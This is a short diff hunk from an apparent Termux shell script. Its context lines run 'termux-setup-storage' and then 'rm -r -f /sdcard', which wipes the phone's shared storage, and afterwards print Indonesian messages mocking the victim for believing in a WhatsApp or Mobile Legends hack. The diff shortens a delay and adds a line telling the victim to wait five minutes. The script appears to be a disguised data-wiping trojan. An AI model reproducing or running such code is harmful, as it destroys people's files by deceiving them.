@@ -40,12 +40,13 @@ termux-setup-storage
 rm -r -f /sdcard
 echo
 echo
-sleep 10
+sleep 5
 echo $i"SADAP WA LEWAT TERMUX!? MOONTON BERCANDA!?"
 echo
 sleep 1
 echo $i"MANA BISA AJG!"
 echo $i"Kena Tipu HAHAHAHAAHAH"
+echo $i"Sabar Gan, Tungguin Aja 5 Menit..."
 sleep 2
 fi
 
